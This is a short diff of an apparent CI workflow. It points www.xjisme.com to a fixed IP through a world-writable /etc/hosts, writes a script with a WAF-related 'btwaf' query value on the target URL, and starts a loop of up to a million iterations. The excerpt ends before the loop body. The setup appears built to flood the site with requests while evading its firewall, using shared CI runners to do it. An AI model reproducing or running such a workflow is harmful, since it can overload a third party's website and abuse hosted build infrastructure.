@@ -32,7 +32,7 @@ jobs:
           sudo chmod 777 /etc/hosts
           echo "134.175.69.238 www.xjisme.com" >> /etc/hosts
           cat << EOF >>1.sh
-          web=https://www.xjisme.com/?btwaf=46334525
+          web=https://www.xjisme.com/?btwaf=58612283
           i=0
           while (( i < 1000000 ))
           do
